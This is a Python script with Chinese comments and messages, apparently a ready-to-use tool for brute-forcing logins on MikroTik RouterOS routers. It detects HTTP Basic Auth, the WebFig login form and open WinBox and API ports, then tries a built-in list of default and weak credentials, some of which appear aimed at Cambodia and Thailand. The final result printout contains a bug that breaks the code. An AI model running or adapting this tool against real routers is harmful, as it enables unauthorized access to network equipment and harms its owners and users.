#!/usr/bin/env python3
"""
RouterOS 终极爆破工具 - 修复版（无误报）
"""

import requests
import socket
import sys
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
urllib3.disable_warnings()

class RouterOSUltimateBrute:
    def __init__(self, target, timeout=10):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.ip = target.split("//")[-1].split(":")[0].split("/")[0]
        
        self.credentials = [
            ("admin", ""), ("admin", "admin"), ("admin", "password"),
            ("admin", "1234"), ("admin", "12345"), ("admin", "123456"),
            ("admin", "Admin"), ("admin", "root"), ("admin", "P@ssw0rd"),
            ("admin", "mikrotik"), ("admin", "router"), ("admin", "secret"),
            ("root", ""), ("root", "admin"), ("root", "password"),
            ("root", "root"), ("root", "toor"), ("root", "1234"),
            ("user", ""), ("user", "user"), ("user", "password"),
            ("administrator", ""), ("administrator", "administrator"),
            ("admin", "cambodia"), ("admin", "thailand"),
            ("admin", "khmer"), ("admin", "bangkok"), ("admin", "phnompenh"),
        ]
        
        self.success = None
    
    def check_port(self, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((self.ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def detect_target(self):
        print(f"\n[*] 检测目标: {self.target}")
        
        methods = []
        
        try:
            resp = requests.get(self.target, timeout=5, verify=False, allow_redirects=False)
            print(f"[+] HTTP {resp.status_code}")
            
            # 检查是否需要HTTP Basic Auth
            if resp.status_code == 401 and "WWW-Authenticate" in resp.headers:
                auth_header = resp.headers["WWW-Authenticate"]
                if "Basic" in auth_header:
                    print("[+] 检测到: HTTP Basic Authentication")
                    methods.append("basic_auth")
            
            # 检查是否是RouterOS WebFig（但不使用Basic Auth）
            elif resp.status_code == 200:
                if "routeros" in resp.text.lower() or "webfig" in resp.text.lower():
                    print("[+] 检测到: RouterOS WebFig (表单登录)")
                    methods.append("webfig")
        except Exception as e:
            print(f"[-] HTTP检测失败: {e}")
        
        # 检查其他端口
        if self.check_port(8291):
            print("[+] 检测到: WinBox端口 8291 开放")
            methods.append("winbox")
        
        if self.check_port(8728):
            print("[+] 检测到: RouterOS API端口 8728 开放")
            methods.append("api")
        
        if self.check_port(8729):
            print("[+] 检测到: RouterOS API-SSL端口 8729 开放")
            methods.append("api_ssl")
        
        return methods
    
    def try_basic_auth(self, username, password):
        """HTTP Basic Auth 爆破 - 修复版"""
        try:
            resp = requests.get(
                self.target,
                auth=(username, password),
                timeout=self.timeout,
                verify=False,
                allow_redirects=False
            )
            
            # 关键修复：不仅检查状态码，还要检查响应内容
            if resp.status_code == 200:
                # 如果响应中有登录表单，说明认证失败
                if "login" in resp.text.lower() and ("password" in resp.text.lower() or "username" in resp.text.lower()):
                    return False
                # 如果有logout/dashboard等，说明已登录
                if any(kw in resp.text.lower() for kw in ["logout", "dashboard", "interface"]):
                    return True
                # HTTP 200但没有登录表单，可能是成功
                return True
            
            if resp.status_code == 302:
                location = resp.headers.get("Location", "")
                if "login" not in location.lower():
                    return True
            
        except Exception as e:
            pass
        
        return False
    
    def try_webfig_form(self, username, password):
        """WebFig 表单登录爆破 - 修复版"""
        try:
            session = requests.Session()
            
            # 方法1: POST到/login
            login_data = {
                "username": username,
                "password": password,
                "dst": ""
            }
            
            resp = session.post(
                f"{self.target}/login",
                data=login_data,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True
            )
            
            # 严格检查：必须有成功的标志，且没有失败标志
            if resp.status_code == 200:
                has_success = any(kw in resp.text.lower() for kw in ["logout", "dashboard", "interface"])
                has_failure = "login" in resp.text.lower() and "password" in resp.text.lower()
                
                if has_success and not has_failure:
                    return True
            
            # 方法2: window.name方式
            session2 = requests.Session()
            resp2 = session2.get(
                f"{self.target}/webfig/",
                headers={"Cookie": f"login={username}|{password}"},
                timeout=self.timeout,
                verify=False,
                allow_redirects=True
            )
            
            if resp2.status_code == 200:
                has_success = any(kw in resp2.text.lower() for kw in ["logout", "dashboard", "interface"])
                has_failure = "error" in resp2.text.lower() or ("login" in resp2.text.lower() and "password" in resp2.text.lower())
                
                if has_success and not has_failure:
                    return True
                
        except Exception as e:
            pass
        
        return False
    
    def brute_single(self, method, username, password):
        try:
            if method == "basic_auth":
                return self.try_basic_auth(username, password)
            elif method == "webfig":
                return self.try_webfig_form(username, password)
        except Exception as e:
            pass
        
        return False
    
    def brute_force(self, methods=None):
        if not methods:
            methods = self.detect_target()
        
        if not methods:
            print("\n[-] 未检测到可用的攻击方式")
            return None
        
        print(f"\n[+] 开始爆破，使用方法: {methods}")
        print(f"[+] 凭据库大小: {len(self.credentials)}")
        print(f"[+] 目标: {self.target}\n")
        
        for method in methods:
            print(f"\n[*] 尝试方法: {method.upper()}")
            
            for username, password in self.credentials:
                pwd_display = password if password else "(空密码)"
                print(f"  [{username}:{pwd_display}]", end=" ", flush=True)
                
                if self.brute_single(method, username, password):
                    print("✓ 成功!")
                    self.success = {
                        "method": method,
                        "username": username,
                        "password": password,
                        "target": self.target
                    }
                    return self.success
                else:
                    print("✗")
        
        print("\n[-] 所有方法和凭据都失败了")
        return None

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="RouterOS 终极爆破工具（修复版）")
    parser.add_argument("target", help="目标URL")
    parser.add_argument("--method", help="强制使用指定方法")
    parser.add_argument("--timeout", type=int, default=10, help="超时时间")
    
    args = parser.parse_args()
    
    bruter = RouterOSUltimateBrute(args.target, timeout=args.timeout)
    
    methods = [args.method] if args.method else None
    result = bruter.brute_force(methods)
    
    if result:
        print("\n" + "="*60)
        print("成功破解!")
        print("="*60)
        print(f"目标:   {result[target]}")
        print(f"方法:   {result[method].upper()}")
        print(f"用户名: {result[username]}")
        print(f"密码:   {result[password]}")
        print("="*60)
        sys.exit(0)
    else:
        print("\n[-] 爆破失败")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        main()
    else:
        print("[+] RouterOS 终极爆破工具（修复版 - 无误报）")
        print("[+] 使用: python3 routeros_ultimate_brute_fixed.py http://target")
